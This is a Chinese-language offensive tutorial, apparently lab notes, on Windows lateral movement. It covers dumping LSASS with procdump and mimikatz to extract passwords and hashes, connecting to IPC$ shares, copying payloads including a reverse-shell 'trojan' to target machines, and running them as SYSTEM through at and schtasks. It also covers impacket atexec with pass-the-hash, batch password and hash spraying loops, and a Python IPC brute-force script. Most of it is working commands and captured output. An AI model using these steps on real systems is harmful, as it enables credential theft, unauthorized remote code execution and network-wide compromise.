# 内网横向-at/schtasks计划任务

在已知目标系统的用户明文密码或者hash的基础上，直接在远程主机上执行命令

## 利用流程

1、建立IPC连接到目标主机

2、拷贝要执行的命令脚本或者恶意后门到目标主机

3、查看目标时间，创建计划任务(at、schtasks)定时执行拷贝到的文件

4、删除IPC连接

## 获取hash与明文密码

procdump配合mimikatz

在目标机器上以管理员权限执行

```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-at%20schtasks%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%2033dd3c1c4d8f466282879eeeb12f9bb1/Untitled.png)

在本地执行

```powershell
sekurlsa::minidump .\lsass.dmp
sekurlsa::logonpasswords full
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-at%20schtasks%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%2033dd3c1c4d8f466282879eeeb12f9bb1/Untitled%201.png)

## IPC连接

对目标主机10.10.10.201进行ipc连接

```powershell
net use \\10.10.10.201\ipc$ "1qaz@WSX" /user:"Administrator"
```

查看建立的连接

```powershell
net use
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-at%20schtasks%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%2033dd3c1c4d8f466282879eeeb12f9bb1/Untitled%202.png)

```powershell
net use \\server\ipc$ "password" /user:username # 链接工作组机器
net use \\server\ipc$ "password" /user:domain\username # 链接域内机器
```

查看C盘中得文件

```powershell
C:\Users\de1ay.DE1AY>dir \\10.10.10.201\c$
 驱动器 \\10.10.10.201\c$ 中的卷没有标签。
 卷的序列号是 B883-EBAA

 \\10.10.10.201\c$ 的目录

2019/10/20  16:44    <DIR>          360Safe
2009/06/11  05:42                24 autoexec.bat
2009/06/11  05:42                10 config.sys
2009/07/14  10:37    <DIR>          PerfLogs
2019/10/20  17:51    <DIR>          Program Files
2023/02/27  19:57    <DIR>          Users
2023/02/27  21:46    <DIR>          Windows
               2 个文件             34 字节
               5 个目录 51,271,446,528 可用字节
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-at%20schtasks%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%2033dd3c1c4d8f466282879eeeb12f9bb1/Untitled%203.png)

```powershell
dir \\192.168.72.128\C$\                # 查看文件列表
copy  \\192.168.72.128\C$\1.bat  1.bat  # 下载文件
copy  1.bat  \\192.168.72.128\C$\1.bat  # 上传文件
net use \\192.168.72.128\C$\1.bat /del  # 删除IPC
net share ipc$ | admin$                 # 开启逻辑共享（C$、D$、E$……）或者 系统共享（ADMIN$）
net view 192.168.72.128                 # 查看对方共享
```

建立IPC常见的错误

```powershell
（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限
（2）51：网络问题，Windows 无法找到网络路径
（3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题
（4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$
（5）1219：提供的凭据和已经存在的凭据集冲突，说明已经建立了IPC$，需要先删除
（6）1326：账号密码错误
（7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况
（8）2242：用户密码过期，目标有账号策略，强制定期更改密码
```

建立IPC失败的原因

```powershell
（1）目标系统不是NT或以上的操作系统
（2）对方没有打开IPC$共享
（3）对方未开启139、445端口，或者被防火墙屏蔽
（4）输出命令、账号密码有错误
```

### 文件上传

```java
C:\Users\evi1ox\Desktop>copy nc.exe \\10.10.10.21\C$\
copy nc.exe \\10.10.10.21\C$\
已复制         1 个文件。
```

### 文件下载

```java
C:\Users\evi1ox\Desktop>copy \\10.10.10.21\C$\windows\system32\cmd.exe cmd.exe
copy \\10.10.10.21\C$\windows\system32\cmd.exe cmd.exe
已复制         1 个文件。
```

## at添加定时任务

```powershell
copy raw.exe \\10.10.10.201\c$ #复制文件到目标C盘
net time \10.10.10.201 #查看远程主机时间
at \\10.10.10.201 9:07 c:\raw.exe #添加定时任务
at \\10.10.10.201 #查看远程主机定时任务
```

实战：

```c
C:\Users\de1ay.DE1AY>net use \\10.10.10.201\ipc$ "1qaz@WSX" /user:"Administrator
"
命令成功完成。

C:\Users\de1ay.DE1AY>net use
会记录新的网络连接。

状态       本地        远程                      网络

-------------------------------------------------------------------------------
OK                     \\10.10.10.201\ipc$       Microsoft Windows Network
命令成功完成。

C:\Users\de1ay.DE1AY>dir \\10.10.10.201\c$
 驱动器 \\10.10.10.201\c$ 中的卷没有标签。
 卷的序列号是 B883-EBAA

 \\10.10.10.201\c$ 的目录

2019/10/20  16:44    <DIR>          360Safe
2009/06/11  05:42                24 autoexec.bat
2009/06/11  05:42                10 config.sys
2009/07/14  10:37    <DIR>          PerfLogs
2019/10/20  17:51    <DIR>          Program Files
2023/02/27  19:57    <DIR>          Users
2023/02/27  21:46    <DIR>          Windows
               2 个文件             34 字节
               5 个目录 51,271,446,528 可用字节

C:\Users\de1ay.DE1AY>dir \\10.10.10.201\c$
 驱动器 \\10.10.10.201\c$ 中的卷没有标签。
 卷的序列号是 B883-EBAA

 \\10.10.10.201\c$ 的目录

2019/10/20  16:44    <DIR>          360Safe
2009/06/11  05:42                24 autoexec.bat
2009/06/11  05:42                10 config.sys
2009/07/14  10:37    <DIR>          PerfLogs
2019/10/20  17:51    <DIR>          Program Files
2023/02/27  19:57    <DIR>          Users
2023/02/27  21:46    <DIR>          Windows
               2 个文件             34 字节
               5 个目录 51,271,446,528 可用字节

C:\Users\de1ay.DE1AY>net use
会记录新的网络连接。

状态       本地        远程                      网络

-------------------------------------------------------------------------------
OK                     \\10.10.10.201\ipc$       Microsoft Windows Network
命令成功完成。

C:\Users\de1ay.DE1AY>net time \\10.10.10.201
\\10.10.10.201 的当前时间是 2023/3/1 9:03:07

命令成功完成。

C:\Users\de1ay.DE1AY>cd Desktop

C:\Users\de1ay.DE1AY\Desktop>dir
 驱动器 C 中的卷没有标签。
 卷的序列号是 36C6-96D5

 C:\Users\de1ay.DE1AY\Desktop 的目录

2023/03/01  09:04    <DIR>          .
2023/03/01  09:04    <DIR>          ..
2023/02/28  14:29           316,928 arp-ping.exe
2023/02/28  14:26           122,368 arp-scan.exe
2023/02/28  08:23            17,920 artifact.exe
2023/02/28  15:15           177,152 cping35.exe
2022/07/07  10:30         5,427,200 fscan.exe
2022/09/07  22:00         5,427,200 fscan64.exe
2023/02/28  14:22             9,237 Invoke-ARPScan.ps1
2023/02/28  17:23            45,824 Invoke-Portscan.ps1
2023/02/28  13:23             9,018 Invoke-TSPingSweep.ps1
2023/02/28  15:53               846 log.txt
2023/02/28  14:39            36,864 nbtscan-1.0.35.exe
2023/02/28  14:45         2,871,296 nbtscan-1.0.35_protected.exe
2023/02/28  17:09            45,272 nc64.exe
2023/02/28  11:19           164,352 netview.exe
2023/02/28  17:27             4,514 nishang.ps1
2020/07/27  12:55            37,667 powercat.ps1
2023/02/28  16:04    <DIR>          PowerSploit-3.0.0
2022/11/03  15:55           424,856 procdump64.exe
2016/06/28  09:51           151,728 PsLoggedon.exe
2023/02/28  20:04            73,802 raw.exe
2023/02/28  15:55    <DIR>          Recon
2023/02/28  17:14               564 result.txt
2023/02/28  17:20         1,691,648 s.exe
2023/02/28  15:05            20,480 ScanLine.exe
2023/02/28  19:22             7,168 shell.exe
2023/02/28  15:09           296,448 tcping64.exe
2023/02/28  19:25             7,168 test.exe
2023/02/28  19:38    <DIR>          xxx
              25 个文件     17,387,520 字节
               5 个目录 23,883,669,504 可用字节

C:\Users\de1ay.DE1AY\Desktop>copy raw.exe \\10.10.10.201\c$
已复制         1 个文件。

C:\Users\de1ay.DE1AY\Desktop>dir \\10.10.10.201\c$
 驱动器 \\10.10.10.201\c$ 中的卷没有标签。
 卷的序列号是 B883-EBAA

 \\10.10.10.201\c$ 的目录

2019/10/20  16:44    <DIR>          360Safe
2009/06/11  05:42                24 autoexec.bat
2009/06/11  05:42                10 config.sys
2009/07/14  10:37    <DIR>          PerfLogs
2019/10/20  17:51    <DIR>          Program Files
2023/02/28  20:04            73,802 raw.exe
2023/02/27  19:57    <DIR>          Users
2023/02/27  21:46    <DIR>          Windows
               3 个文件         73,836 字节
               5 个目录 51,271,327,744 可用字节

C:\Users\de1ay.DE1AY\Desktop>net time \10.10.10.201
此命令的语法是:

NET TIME

[\\computername | /DOMAIN[:domainname] | /RTSDOMAIN[:domainname]] [/SET]

C:\Users\de1ay.DE1AY\Desktop>net time \\10.10.10.201
\\10.10.10.201 的当前时间是 2023/3/1 9:05:04

命令成功完成。

C:\Users\de1ay.DE1AY\Desktop>at
拒绝访问。

C:\Users\de1ay.DE1AY\Desktop>at \\10.10.10.201 9:07 c:\raw.exe
新加了一项作业，其作业 ID = 1

C:\Users\de1ay.DE1AY\Desktop>
C:\Users\de1ay.DE1AY\Desktop>at \\10.10.10.201
状态 ID     日期                    时间          命令行
-------------------------------------------------------------------------------
        1   今天                    9:07          c:\raw.exe

C:\Users\de1ay.DE1AY\Desktop>at \\10.10.10.201
```

## schtasks定时任务

windwos server 2012后就没有at命令了，只有schtasks

```java
net use \\10.10.10.10\ipc$ "1qaz@WSX" /user:"Administrator" #建立IPC连接

copy raw.exe \\10.10.10.10\c$ #复制文件

schtasks /create /s 10.10.10.10 /u administrator /p 1qaz@WSX /ru "SYSTEM" /tn raw /sc DAILY /tr c:\raw.exe /F #添加任务

schtasks /run /s 10.10.10.10 /u administrator /p 1qaz@WSX /tn raw /i #立即执行

schtasks /delete /s 10.10.10.10 /u administrator/p 1qaz@WSX/tn raw /f  # 删除计划任务
```

参数说明：

- /s指定远程机器名或ip地址
- /ru指定运行任务的用户权限，这里是SYSTEM
- /tn是任务名称
- /sc是任务运行频率
- /tr指定运行的文件
- /F表示如果指定的任务已经存在，则强制创建任务并抑制警告
- /i表示立即运行，不需要和时间挂钩，可以立即执行任务。

上面是立即执行，下面这是定时的

```java
命令
schtasks /create /s 10.10.10.10 /u Administrator /p x /ru "SYSTEM" /tn adduser /sc DAILY /st 19:39 /tr c:\\add.bat /F
结果
SUCCESS: The scheduled task "adduser" has successfully been created.
```

## 整理

### AT

```java
\#at < Windows2012
net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\ad
ministrator # 建立ipc连接：
copy add.bat \\192.168.3.21\c$ #拷贝执行文件到目标机器
at \\192.168.3.21 15:47 c:\add.bat  #添加计划任务
```

### ****Schtasks****

```java
Schtasks >=Windows2012
net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\administrator # 建立ipc连接：
copy add.bat \\192.168.3.32\c$ #复制文件到其C盘
schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件
schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务
schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
\#schtasks >=Windows2012
net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
ministrator # 建立ipc连接：
copy add.bat \\192.168.3.32\c$ #复制文件到其C盘
schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件
schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务
schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
```

```java
C:\Windows\system32>copy C:\reverse.exe \\192.168.88.131\c$\reverse.exe 
#复制木马文件到目标机器

C:\Windows\system32>schtasks /create /tn task1 /U  edu.org\eas  /P chen@2021  /tr "C:\reverse.exe" /sc MINUTE /mo 1 /s 192.168.88.131 /RU system /f
#创建计划任务

C:\Windows\system32>schtasks /run /tn task1 /U  edu.org\eas  /P chen@2021 /s 192.168.88.131
#运行计划任务

C:\Windows\system32>schtasks /delete /tn task1 /f /U  edu.org\eas  /P chen@2021 /s 192.168.88.131
#删除计划任务
```

IPC$已登录情况，省略账号密码

```java
C:\Windows\system32>schtasks /create /tn task1 /tr "C:\reverse.exe" /sc MINUTE /mo 1 /s 192.168.88.131 /RU system /f
成功: 成功创建计划任务 "task1"。

C:\Windows\system32>schtasks /run /tn task1 /s 192.168.88.131
成功: 尝试运行 "task1"。
```

## ****atexec工具****

支持命令执行回显，不免杀

下载地址：

[https://github.com/maaaaz/impacket-examples-windows/releases/tag/v0.9.17](https://github.com/maaaaz/impacket-examples-windows/releases/tag/v0.9.17)

使用：

### 明文连接

```java
C:\Users\mssql\Desktop>atexec.exe ./administrator:1qaz@WSX@10.10.10.10 "whoami"
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[!] This will work ONLY on Windows >= Vista
[*] Creating task \ZdHLvqlH
[*] Running task \ZdHLvqlH
[*] Deleting task \ZdHLvqlH
[*] Attempting to read ADMIN$\Temp\ZdHLvqlH.tmp
[*] Attempting to read ADMIN$\Temp\ZdHLvqlH.tmp
nt authority\system

C:\Users\mssql\Desktop>atexec.exe ./administrator:1qaz@WSX@10.10.10.10 "ipconfig
"
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[!] This will work ONLY on Windows >= Vista
[*] Creating task \rbmyEKMF
[*] Running task \rbmyEKMF
[*] Deleting task \rbmyEKMF
[*] Attempting to read ADMIN$\Temp\rbmyEKMF.tmp

Windows IP 配置

以太网适配器 Ethernet1:

   连接特定的 DNS 后缀 . . . . . . . : localdomain
   本地链接 IPv6 地址. . . . . . . . : fe80::f526:a425:e3a8:a5b1%24
   IPv4 地址 . . . . . . . . . . . . : 192.168.5.135
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.5.2

以太网适配器 Ethernet0:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::39e1:b031:bc78:5b2c%12
   IPv4 地址 . . . . . . . . . . . . : 10.10.10.10
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 10.10.10.1

隧道适配器 isatap.localdomain:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : localdomain

隧道适配器 isatap.{A5CDA27E-AD13-448E-9EAA-DACE69D64EAE}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . :

C:\Users\mssql\Desktop>
```

### hash连接

```xml-dtd
C:\Users\mssql\Desktop>atexec.exe -hashes :161cff084477fe596a5db81874498a24 ./ad
ministrator@10.10.10.10 "whoami"
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[!] This will work ONLY on Windows >= Vista
[*] Creating task \QNNslqCA
[*] Running task \QNNslqCA
[*] Deleting task \QNNslqCA
[*] Attempting to read ADMIN$\Temp\QNNslqCA.tmp
[*] Attempting to read ADMIN$\Temp\QNNslqCA.tmp
nt authority\system

C:\Users\mssql\Desktop>
```

### 连接域内用户

```java
C:\Users\mssql\Desktop>atexec.exe de1ay.com/administrator:1qaz@WSX@10.10.10.10 "
whoami"
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[!] This will work ONLY on Windows >= Vista
[*] Creating task \sKIjRFNI
[*] Running task \sKIjRFNI
[*] Deleting task \sKIjRFNI
[*] Attempting to read ADMIN$\Temp\sKIjRFNI.tmp
[*] Attempting to read ADMIN$\Temp\sKIjRFNI.tmp
nt authority\system
```

该工具是一个半交互的工具，适用于webshell下，socks代理下

## 批量

在渗透利用中可以收集用户名、明文密码、密码hash、远程主机等做成字典，批量读取进行测试

### 批量连接IPC

```java
FOR /F %i in (ips.txt) do net use \\%i\ipc$ "1qaz@WSX" /user:administrator
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-at%20schtasks%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%2033dd3c1c4d8f466282879eeeb12f9bb1/Untitled%204.png)

### 批量检测命令执行

```java
FOR /F %i in (ips.txt) do atexec.exe ./administrator:1qaz@WSX@%i whoami
```

```java
C:\Users\mssql\Desktop>atexec.exe ./administrator:1qaz@WSX@10.10.10.10 whoami
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[!] This will work ONLY on Windows >= Vista
[*] Creating task \RLgPpSam
[*] Running task \RLgPpSam
[*] Deleting task \RLgPpSam
[*] Attempting to read ADMIN$\Temp\RLgPpSam.tmp
[*] Attempting to read ADMIN$\Temp\RLgPpSam.tmp
nt authority\system

C:\Users\mssql\Desktop>atexec.exe ./administrator:1qaz@WSX@10.10.10.80 whoami
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[!] This will work ONLY on Windows >= Vista
[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This
is either due to a bad username or authentication information.)

C:\Users\mssql\Desktop>atexec.exe ./administrator:1qaz@WSX@10.10.10.22 whoami
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[!] This will work ONLY on Windows >= Vista
[-] [Errno Connection error (10.10.10.22:445)] [Errno 10060]
```

### 批量检测密码

明文版

```java
FOR /F %i in (pass.txt) do atexec.exe ./administrator:%i@192.168.3.21 whoami
```

hash

```java
FOR /F %i in (hash.txt) do atexec.exe -hashes :%i ./administrator@192.168.3.21 whoami
```

### py脚本

```java
import os,time
ips={
    '192.168.3.21',
    '192.168.3.25',
    '192.168.3.29',
    '192.168.3.30',
    '192.168.3.31',
    '192.168.3.33'
}

users={
    'Administrator',
    'boss',
    'dbadmin',
    'fileadmin',
    'mack',
    'mary',
    'vpnadm',
    'webadmin'
}
passs={
    'admin',
    'admin!@#45',
    'Admin12345'
}

for ip in ips:
    for user in users:
        for mima in passs:
            exec="net use \\"+ "\\"+ip+'\ipc$ '+mima+' /user:god\\'+user
            print('--->'+exec+'<---')
            os.system(exec)
            time.sleep(1)
```

```java
FOR /F %%i in (ips.txt) do atexec.exe -hashes :HASH ./administrator@%%i  whoami #利用hash验证主机列表ips.txt

FOR /F %%i in (hashes.txt) do atexec.exe -hashes %%i ./administrator@192.168.3.76  whoami #指定主机进行用户hash列表（hashes.txt）爆破

FOR /F %%i in (passwords.txt) do atexec.exe  ./administrator:%%i@192.168.3.76  whoami #指定主机进行明文密码列表（passwords.txt）爆破

FOR /F %%i in (ips.txt) do atexec.exe ./administrator:password123@%%i  whoami  # 利用明文密码验证主机列表ips.txt
```